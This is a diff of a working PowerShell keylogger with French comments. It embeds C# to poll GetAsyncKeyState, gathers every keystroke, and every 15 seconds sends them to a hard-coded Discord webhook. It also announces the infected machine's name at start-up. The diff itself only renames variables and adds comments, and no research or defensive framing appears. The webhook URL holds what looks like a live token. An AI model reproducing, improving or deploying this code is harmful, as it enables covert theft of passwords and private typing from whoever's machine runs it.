@@ -1,6 +1,7 @@
 $webhook = 'https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW'
 
-iwr $webhook -Method Post -Body (@{content="Keylogger natif lancé – $env:COMPUTERNAME"}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
+# Message de démarrage
+iwr $webhook -Method Post -Body (@{content="Keylogger lancé – $env:COMPUTERNAME"}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
 
 $code = @'
 using System;
@@ -12,25 +13,27 @@ public class K {
 
 Add-Type $code
 
-$buf = ''
+$buffer = ''
 $lastSend = Get-Date
 
-while($true){
+while($true) {
     Start-Sleep -m 30
-    for($i=8;$i -le 254;$i++){
-        if([K]::GetAsyncKeyState($i) -eq -32767){
-            $buf += [char]$i
+    
+    # Capture toutes les touches
+    for($i=8;$i -le 254;$i++) {
+        if([K]::GetAsyncKeyState($i) -eq -32767) {
+            $buffer += [char]$i
         }
     }
 
-    # Envoi toutes les 15 secondes, même si buffer vide (pour montrer qu'il est vivant)
-    if(((Get-Date) - $lastSend).TotalSeconds -ge 15){
-        if($buf.Length -gt 0){
-            iwr $webhook -Method Post -Body (@{content=$buf}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
+    # Envoi FORCÉ toutes les 15 secondes
+    if(((Get-Date) - $lastSend).TotalSeconds -ge 15) {
+        if($buffer.Length -gt 0) {
+            iwr $webhook -Method Post -Body (@{content=$buffer}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
         } else {
             iwr $webhook -Method Post -Body (@{content="[heartbeat]"}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
         }
-        $buf = ''
+        $buffer = ''
         $lastSend = Get-Date
     }
 }
